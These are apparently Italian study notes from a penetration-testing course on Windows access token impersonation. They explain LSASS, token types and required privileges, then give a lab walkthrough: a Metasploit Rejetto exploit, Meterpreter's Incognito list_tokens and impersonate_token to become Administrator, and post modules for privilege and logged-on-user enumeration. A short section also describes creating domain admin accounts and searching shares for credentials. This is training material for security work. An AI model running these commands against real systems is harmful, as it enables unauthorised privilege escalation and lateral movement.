```
In Windows, l'authenticazione dei processi di viene gestita e creata dal LSASS.
Un Access Token identifica il contesto di sicurezza che descrive il processo in esecuzione. E' simile ad un Cookie in un applicazione Web.

L'Access Token viene generato dal processo "winlogon.exe", ogni volta che un utente esegue l'autenticazione con successo e include l'identità e i privilegi dell'account utente associato a thread o processo. Questo token viene quindi collegato al processo userinit.exe, dopodiché tutti i file child i processi avviati da un utente erediteranno una copia del token di accesso dal suo creatore e lo faranno eseguito con i privilegi dello stesso token di accesso.

A un token di accesso verrà generalmente assegnato uno dei seguenti livelli di sicurezza:
- I token di rappresentazione vengono creati come risultato diretto di un accesso non interattivo su Windows, in genere tramite servizi di sistema specifici o accessi al dominio.
- I token di delegato vengono generalmente creati tramite un accesso interattivo su Windows, principalmente attraverso un login tradizionale o attraverso protocolli di accesso remoto come RDP

L'impersonificazione del token di Windows è una tecnica utilizzata per eseguire un processo o un'applicazione con i privilegi di sicurezza di un altro utente o servizio. In altre parole, consente a un processo di agire come se fosse un utente diverso, senza dover effettuare l'accesso con le credenziali di quell'utente.

Il processo di rappresentazione dei token di accesso per elevare i privilegi su un sistema dipendono principalmente dai privilegi assegnati all'account che è stato sfruttato ottenere l'accesso iniziale nonché i token di rappresentazione o delega disponibili.

# Exploiting with Token di rappresentazione
Di seguito sono riportati i privilegi associati all'utenza, necessari per un attacco di rappresentazione riuscito:
- SeAssignPrimaryToken: consente a un utente di rappresentare i token.
- SeCreateToken: consente a un utente di creare un token arbitrario con amministrazione
privilegi.
- SeImpersonatePrivilege: consente a un utente di creare un processo protetto
contesto di un altro utente in genere con privilegi amministrativi.

# Access Token Impersonification - Incognito Tools
Incognito è un modulo di Meterpreter che permette di visualizzare i tokens disponibili che possono permettere l'impersonificazione. 

# Access Token Impersonification pt.2
Ecco alcuni punti chiave riguardanti l'impersonificazione del token di Windows:

1. Token di accesso: In Windows, ogni utente o servizio ha un token di accesso associato. Questo token contiene informazioni sulle autorizzazioni e i diritti dell'utente o del servizio. L'impersonificazione coinvolge la sostituzione temporanea di un token con un altro.

2. Impersonificazione di livello di utente: Un'applicazione può impersonare un utente specifico per eseguire operazioni che richiedono autorizzazioni specifiche. Ad esempio, un'applicazione di backup potrebbe impersonare un utente con privilegi di amministratore per accedere ai file di sistema.

3. Impersonificazione di livello di servizio: I servizi di Windows possono impersonare altri servizi o account di sistema per eseguire operazioni specifiche. Ad esempio, un servizio di database potrebbe impersonare un account di servizio per accedere al database.

4. API di impersonificazione: Windows fornisce API per l'impersonificazione, come `LogonUser`, `ImpersonateLoggedOnUser` e `RevertToSelf`. Queste API consentono a un'applicazione di acquisire un token di accesso per un utente specifico e di impersonarlo.

5. Sicurezza: L'impersonificazione deve essere utilizzata con cautela e solo quando necessario. È importante garantire che l'impersonificazione sia limitata alle operazioni strettamente necessarie e che venga eseguita solo da processi attendibili.


# Altro
1. Impersonificazione per accedere alle macchine in Remote Desktop Protocolli: E' possibile utilizzare un token dalla lista di persone che hanno fatto accesso al tuo sistema per poter creare una utenza admin con id e password di cui siamo a conoscenza e successivamente utilizzarle per effettuare query per cercare lista di id e password di utenti.  
    
2. list_tokens –u Per recuperare la lista dei token di utenti che hanno effettuato l'accesso ad un sistema, e con il quale è possibile

3. Token kerberos Che ci sono in memoria, possiamo prendere i token recuperati da list_tokens, possiamo impersonificarlo, e posso aggiungere ad es. un amministratore di dominio per creare la password utile per poterla riutilizzare, all'interno del programma crackmapexec, cercando con quell'aministratore di dominio. Essendo un account di dominio è possibile che abbia visibilità su tutti gli utenti di dominio all'interno del gruppo, quindi cerco directory/share di rete da poter raggiungere utilizzando smbclient. Se trovo qualcosa navigo le shell per trovare file di configurazioni da poter utilizzar per attacchi con payload Metasploit automatizzati es. utilizzando metasploit.



# Metasploit - Access Token Impersonification with Incognito:
> nmap -sV -p 80 10.4.22.75
> exploit rejetto
> got meterpreter session
> getuid

Provo ad aprire dei file, ma non ho i permessi, quindi posso verificare se ci sono dei token in memoria da poter utilizzare per impersonificare altre utenze privilegiate.
Se migro all'interno di un processo, posso ottenere il token utilizzato dal processo e se possiede i corretti privilegi l'utenza, impersonificarla.

Cerco il processo "explorer" per verificare con che privilegi gira
> pgrep explorer 

# Uso Incognito per cercare tutti i token (di delega o rappresentanza) dei vari processi disponibili
> load incognito
> list_tokens -u
[Delegation Token Available]
ATTACKDEFENSE\Administrator

# Impersonificazione 
> impersonate_token ATTACKDEFENSE\\Administrator
> getuid
[ATTACKDEFENSE\Administrator]

> cat C:\\Users\\Administrator\\Desktop\\flag.txt



# Metasploit - Win Privs
# Enumero i privilegi dell'utente corrente che potrei impersonificare 
got meterpreter shell
> background
> use post/windows/gather/win_privs
> set session 1
> run


# Metasploit - Enum Logged Users
got meterpreter shell
> background
> use post/windows/gather/enum_logged_on_users
> set SESSION 1
> run








```